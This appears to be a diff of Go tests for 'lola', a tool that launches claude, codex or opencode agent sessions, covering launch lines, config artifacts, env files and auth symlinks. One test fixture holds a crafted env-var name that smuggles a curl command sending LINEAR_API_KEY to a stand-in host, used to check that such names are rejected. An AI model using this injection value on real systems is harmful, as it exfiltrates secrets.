@@ -11,6 +11,7 @@ import (
 	"strings"
 	"testing"
 
+	"github.com/sushidev-team/lola/internal/agent"
 	"github.com/sushidev-team/lola/internal/config"
 	"github.com/sushidev-team/lola/internal/hook"
 	"github.com/sushidev-team/lola/internal/linear"
@@ -123,12 +124,14 @@ func TestSpawnHappyPathFullSequence(t *testing.T) {
 	id := "lola-nori-eng-42"
 	dir := filepath.Join(f.root, "nori", id)
 
-	// Returned session for the store.
+	// Returned session for the store. A fresh spawn records its resolved agent
+	// kind explicitly; with no [defaults].agent or per-project override the
+	// fixture resolves to "claude" (the legacy default).
 	want := session.Session{
 		ID: id, Source: "native", Project: "nori", Issue: "ENG-42",
 		Title:     "Fix login flow",
 		IssueUUID: "uuid-42", Branch: "lola/eng-42", Repo: "owner/nori",
-		TmuxName: id, Status: StatusWorking,
+		TmuxName: id, Status: StatusWorking, Agent: "claude",
 	}
 	if !reflect.DeepEqual(got, want) {
 		t.Errorf("session = %+v\nwant      %+v", got, want)
@@ -225,6 +228,15 @@ func assertMode(t *testing.T, path string, want os.FileMode) {
 	}
 	if fi.Mode().Perm() != want {
 		t.Errorf("%s mode = %o, want %o", path, fi.Mode().Perm(), want)
+	}
+}
+
+// assertAbsent fails unless path does not exist. Uses Lstat so a dangling
+// symlink still counts as present (a leaked artifact, not absence).
+func assertAbsent(t *testing.T, path string) {
+	t.Helper()
+	if _, err := os.Lstat(path); !os.IsNotExist(err) {
+		t.Errorf("%s must not exist (err=%v)", path, err)
 	}
 }
 
@@ -356,6 +368,187 @@ func TestSpawnChromeFailureIsAdvisoryOnly(t *testing.T) {
 	}
 	if !strings.Contains(logged, "styling failed") {
 		t.Errorf("chrome failure must be logged via Logf, got %q", logged)
+	}
+}
+
+// TestSpawnPerAgentLaunchAndArtifacts is the core pluggable-agent coverage:
+// each of the three kinds resolves to its own binary + launch args, writes its
+// own lifecycle-callback artifact(s), records its kind on the returned session,
+// and — codex — exports CODEX_HOME / — opencode — excludes .opencode/ from git.
+// The claude path stays byte-identical to the legacy behavior (a claude spawn
+// still writes .lola/settings.json and no CODEX_HOME).
+func TestSpawnPerAgentLaunchAndArtifacts(t *testing.T) {
+	// A deterministic (empty) codex source so the codex case never links the
+	// developer's real ~/.codex/auth.json into a temp worktree.
+	t.Setenv("CODEX_HOME", t.TempDir())
+
+	id := "lola-nori-eng-42"
+	cases := []struct {
+		name     string
+		kind     agent.Kind
+		execFrag string // substring the launch line must contain (binary + args)
+	}{
+		{"claude", agent.Claude, "exec /usr/local/bin/claude --settings .lola/settings.json "},
+		{"codex", agent.Codex, "exec codex --ask-for-approval never --sandbox workspace-write "},
+		{"opencode", agent.OpenCode, "exec opencode --prompt "},
+	}
+	for _, c := range cases {
+		t.Run(c.name, func(t *testing.T) {
+			f := newFixture(t, "", "")
+			f.n.Cfg.Defaults.Agent = string(c.kind)
+
+			got, err := f.n.Spawn(context.Background(), f.p, issueENG42())
+			if err != nil {
+				t.Fatalf("Spawn: %v", err)
+			}
+			dir := filepath.Join(f.root, "nori", id)
+
+			// The session records its resolved kind.
+			if got.Agent != string(c.kind) {
+				t.Errorf("session.Agent = %q, want %q", got.Agent, c.kind)
+			}
+
+			// The launch line uses the right binary + args, and matches
+			// launchCommand exactly (pinned per-kind in TestLaunchCommandPerAgent).
+			tmuxCalls := loggedArgs(t, f.tmuxLog)
+			if !strings.Contains(tmuxCalls, c.execFrag) {
+				t.Errorf("launch line missing %q:\n%s", c.execFrag, tmuxCalls)
+			}
+			if !strings.Contains(tmuxCalls, f.n.launchCommand(id, c.kind)) {
+				t.Errorf("tmux launch line does not match launchCommand:\n%s", tmuxCalls)
+			}
+
+			// Per-kind callback artifact(s) and the negative space (no foreign
+			// artifact leaks in).
+			settings := filepath.Join(dir, ".lola", "settings.json")
+			codexCfg := filepath.Join(dir, ".lola", "codex", "config.toml")
+			plugin := filepath.Join(dir, ".opencode", "plugins", "lola-hook.js")
+			switch c.kind {
+			case agent.Claude:
+				if got := readFile(t, settings); got != string(hook.SettingsJSON(f.n.LolaBin)) {
+					t.Errorf("settings.json = %s, want hook wiring", got)
+				}
+				assertAbsent(t, codexCfg)
+				assertAbsent(t, filepath.Join(dir, ".opencode"))
+			case agent.Codex:
+				if got := readFile(t, codexCfg); got != string(agent.CodexConfigTOML(f.n.LolaBin)) {
+					t.Errorf("codex config.toml = %s, want CodexConfigTOML", got)
+				}
+				assertMode(t, codexCfg, 0o600)
+				assertAbsent(t, settings) // no claude artifact for codex
+			case agent.OpenCode:
+				if got := readFile(t, plugin); got != string(agent.OpenCodePluginJS(f.n.LolaBin)) {
+					t.Errorf("opencode plugin = %s, want OpenCodePluginJS", got)
+				}
+				assertMode(t, plugin, 0o600)
+				assertAbsent(t, settings) // no claude artifact for opencode
+			}
+
+			// CODEX_HOME is exported for codex only, pointing at the per-session
+			// .lola/codex; other kinds never carry it.
+			env := readFile(t, filepath.Join(dir, ".lola", "env"))
+			codexHome := filepath.Join(dir, ".lola", "codex")
+			if c.kind == agent.Codex {
+				want := "CODEX_HOME=" + shQuote(codexHome) + "\n"
+				if !strings.Contains(env, want) {
+					t.Errorf(".lola/env must export %q:\n%s", want, env)
+				}
+			} else if strings.Contains(env, "CODEX_HOME") {
+				t.Errorf("%s session must not export CODEX_HOME:\n%s", c.kind, env)
+			}
+			// CODEX_HOME (a path) must never reach the tmux argv.
+			if strings.Contains(tmuxCalls, "CODEX_HOME") {
+				t.Errorf("CODEX_HOME must stay in the env file, not on argv:\n%s", tmuxCalls)
+			}
+
+			// .opencode/ is git-excluded for opencode only; .lola/ always is.
+			exclude := readFile(t, filepath.Join(f.commonDir, "info", "exclude"))
+			if !strings.Contains(exclude, ".lola/\n") {
+				t.Errorf("info/exclude must always carry .lola/:\n%s", exclude)
+			}
+			if c.kind == agent.OpenCode {
+				if !strings.Contains(exclude, ".opencode/\n") {
+					t.Errorf("opencode session must exclude .opencode/:\n%s", exclude)
+				}
+			} else if strings.Contains(exclude, ".opencode/") {
+				t.Errorf("%s session must not exclude .opencode/:\n%s", c.kind, exclude)
+			}
+		})
+	}
+}
+
+// TestSpawnResolvesPerProjectAgentOverride proves Spawn resolves the kind
+// through AgentForProject: a per-[[project]].agent override beats
+// [defaults].agent, so the launch and the recorded kind follow the project.
+func TestSpawnResolvesPerProjectAgentOverride(t *testing.T) {
+	t.Setenv("CODEX_HOME", t.TempDir())
+	f := newFixture(t, "", "")
+	f.n.Cfg.Defaults.Agent = "claude"   // global default
+	f.n.Cfg.Projects[0].Agent = "codex" // project override wins
+
+	got, err := f.n.Spawn(context.Background(), f.p, issueENG42())
+	if err != nil {
+		t.Fatalf("Spawn: %v", err)
+	}
+	if got.Agent != "codex" {
+		t.Errorf("session.Agent = %q, want codex (project override)", got.Agent)
+	}
+	if !strings.Contains(loggedArgs(t, f.tmuxLog), "exec codex ") {
+		t.Errorf("launch must use codex per the project override:\n%s", loggedArgs(t, f.tmuxLog))
+	}
+}
+
+// TestSpawnCodexLinksExistingAuth: when the user has a real codex login
+// (auth.json under $CODEX_HOME), Spawn symlinks it into the per-session
+// CODEX_HOME so `codex` stays authenticated.
+func TestSpawnCodexLinksExistingAuth(t *testing.T) {
+	userHome := t.TempDir()
+	src := filepath.Join(userHome, "auth.json")
+	if err := os.WriteFile(src, []byte(`{"token":"x"}`), 0o600); err != nil {
+		t.Fatal(err)
+	}
+	t.Setenv("CODEX_HOME", userHome)
+
+	f := newFixture(t, "", "")
+	f.n.Cfg.Defaults.Agent = "codex"
+	if _, err := f.n.Spawn(context.Background(), f.p, issueENG42()); err != nil {
+		t.Fatalf("Spawn: %v", err)
+	}
+	link := filepath.Join(f.root, "nori", "lola-nori-eng-42", ".lola", "codex", "auth.json")
+	target, err := os.Readlink(link)
+	if err != nil {
+		t.Fatalf("auth.json must be a symlink to the user's login: %v", err)
+	}
+	if target != src {
+		t.Errorf("auth.json -> %q, want %q", target, src)
+	}
+}
+
+// TestSpawnCodexWithoutAuthSourceStillSpawns: an absent codex login is not an
+// error — no auth.json symlink is created, the config.toml is still written,
+// and the session launches (API-key users authenticate via OPENAI_API_KEY).
+func TestSpawnCodexWithoutAuthSourceStillSpawns(t *testing.T) {
+	t.Setenv("CODEX_HOME", t.TempDir()) // empty: no auth.json to link
+
+	f := newFixture(t, "", "")
+	f.n.Cfg.Defaults.Agent = "codex"
+	got, err := f.n.Spawn(context.Background(), f.p, issueENG42())
+	if err != nil {
+		t.Fatalf("Spawn must succeed without a codex login: %v", err)
+	}
+	if got.Status != StatusWorking {
+		t.Errorf("Status = %q, want %q", got.Status, StatusWorking)
+	}
+	dir := filepath.Join(f.root, "nori", "lola-nori-eng-42")
+	if _, err := os.Lstat(filepath.Join(dir, ".lola", "codex", "auth.json")); !os.IsNotExist(err) {
+		t.Errorf("no auth.json symlink may be created when the source is absent (err=%v)", err)
+	}
+	// The config.toml was still written and the session launched.
+	if _, err := os.Stat(filepath.Join(dir, ".lola", "codex", "config.toml")); err != nil {
+		t.Errorf("codex config.toml must be written: %v", err)
+	}
+	if !strings.Contains(loggedArgs(t, f.tmuxLog), "new-session -d -s lola-nori-eng-42") {
+		t.Errorf("codex session must launch without a login:\n%s", loggedArgs(t, f.tmuxLog))
 	}
 }
 
@@ -858,7 +1051,7 @@ func TestExcludeLolaDirResolvesWorktreePointer(t *testing.T) {
 
 func TestLaunchCommandQuoting(t *testing.T) {
 	n := &Native{} // ClaudeBin empty -> "claude" from PATH
-	got := n.launchCommand("lola-nori-eng-42")
+	got := n.launchCommand("lola-nori-eng-42", agent.Claude)
 	// The POSIX line is wrapped in `sh -c '...'` so the user's login shell
 	// (which may be fish/csh/tcsh, not a POSIX sh) only has to exec `sh`; the
 	// inner single quotes around the prompt are escaped as '\''.
@@ -875,13 +1068,41 @@ func TestLaunchCommandQuoting(t *testing.T) {
 	}
 
 	n.ClaudeBin = "/odd path/claude's bin"
-	got = n.launchCommand("lola-nori-eng-42")
+	got = n.launchCommand("lola-nori-eng-42", agent.Claude)
 	if !strings.Contains(got, `/odd path/claude`) {
 		t.Errorf("launchCommand must include the binary path:\n%s", got)
 	}
 	// The launch line never carries env inline; it only sources the file.
 	if strings.Contains(got, "LOLA_SESSION") || strings.Contains(got, "env ") {
 		t.Errorf("launchCommand must not put env on argv:\n%s", got)
+	}
+}
+
+// TestLaunchCommandPerAgent pins the exact launch line for the non-claude
+// agents: the resolved binary (codex/opencode, never ClaudeBin) and each
+// agent's unattended launch args from agent.LaunchArgs, wrapped in the same
+// `sh -c` POSIX discipline. The prompt argv is identical across agents.
+func TestLaunchCommandPerAgent(t *testing.T) {
+	id := "lola-nori-eng-42"
+	// ClaudeBin must be IGNORED for non-claude kinds — they use their own binary.
+	n := &Native{ClaudeBin: "/should/not/be/used/claude"}
+	esc := `'\''You are lola session ` + id + `. Read .lola/prompt.md in the current directory first; it contains your task briefing.'\''`
+
+	wantCodex := "exec sh -c 'set -a; . ./.lola/env; set +a; exec codex --ask-for-approval never --sandbox workspace-write " + esc + "'"
+	if got := n.launchCommand(id, agent.Codex); got != wantCodex {
+		t.Errorf("codex launchCommand:\n%s\nwant:\n%s", got, wantCodex)
+	}
+
+	wantOpenCode := "exec sh -c 'set -a; . ./.lola/env; set +a; exec opencode --prompt " + esc + " --auto'"
+	if got := n.launchCommand(id, agent.OpenCode); got != wantOpenCode {
+		t.Errorf("opencode launchCommand:\n%s\nwant:\n%s", got, wantOpenCode)
+	}
+
+	// Neither non-claude line may leak the ClaudeBin override.
+	for _, k := range []agent.Kind{agent.Codex, agent.OpenCode} {
+		if strings.Contains(n.launchCommand(id, k), "should/not/be/used") {
+			t.Errorf("%s launch must not use ClaudeBin", k)
+		}
 	}
 }
 
@@ -912,7 +1133,7 @@ func TestLaunchCommandRunsUnderNonPosixLoginShells(t *testing.T) {
 	}
 
 	n := &Native{}
-	line := n.launchCommand("lola-x-eng-1")
+	line := n.launchCommand("lola-x-eng-1", agent.Claude)
 
 	for _, shell := range []string{"/bin/sh", "/bin/bash", "/bin/zsh", "/bin/csh", "/bin/tcsh"} {
 		if _, err := os.Stat(shell); err != nil {
@@ -949,13 +1170,14 @@ func TestEnvFileForwardsSessionKeyAndProjectEnv(t *testing.T) {
 		"LINEAR_API_KEY='lin secret'\n" +
 		"APP_ENV='local dev'\n" +
 		"B_VAR=plain\n"
-	if got := string(n.envFile(p, "lola-nori-eng-42")); got != want {
+	// A claude session gets no CODEX_HOME line regardless of dir.
+	if got := string(n.envFile(p, "lola-nori-eng-42", "/wt", agent.Claude)); got != want {
 		t.Errorf("envFile:\n%q\nwant:\n%q", got, want)
 	}
 
 	// nil provider: no key line at all.
 	n2 := &Native{}
-	if got := string(n2.envFile(config.Project{}, "id")); got != "LOLA_SESSION=id\n" {
+	if got := string(n2.envFile(config.Project{}, "id", "/wt", agent.Claude)); got != "LOLA_SESSION=id\n" {
 		t.Errorf("envFile without provider = %q, want only LOLA_SESSION", got)
 	}
 }
@@ -972,7 +1194,7 @@ func TestEnvFileSkipsNonIdentifierNames(t *testing.T) {
 		"z=1; curl evil $LINEAR_API_KEY #": "x", // crafted injection name
 		"has-dash":                         "y", // not an identifier
 	}}
-	got := string(n.envFile(p, "lola-x-eng-1"))
+	got := string(n.envFile(p, "lola-x-eng-1", "/wt", agent.Claude))
 	if !strings.Contains(got, "GOOD=ok\n") {
 		t.Errorf("envFile dropped a valid identifier:\n%s", got)
 	}
